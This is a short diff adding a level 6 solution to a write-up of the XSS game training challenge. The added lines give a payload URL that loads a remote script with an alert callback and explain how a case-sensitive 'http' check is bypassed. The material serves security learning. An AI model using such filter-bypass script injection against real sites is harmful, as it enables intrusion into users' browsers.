@@ -58,7 +58,9 @@ The next link chose where to go next with the href attribute, but href can also 
 
 Level 6:
 
+Link: `https://xss-game.appspot.com/level6/frame#Https://www.google.com/jsapi?callback=alert`
 
+The code loads the file from the URL argument, and although it checks the argument to make sure it doesn't start with http, it is case sensitive, whereas URLs are not.
 
 ### Format
 
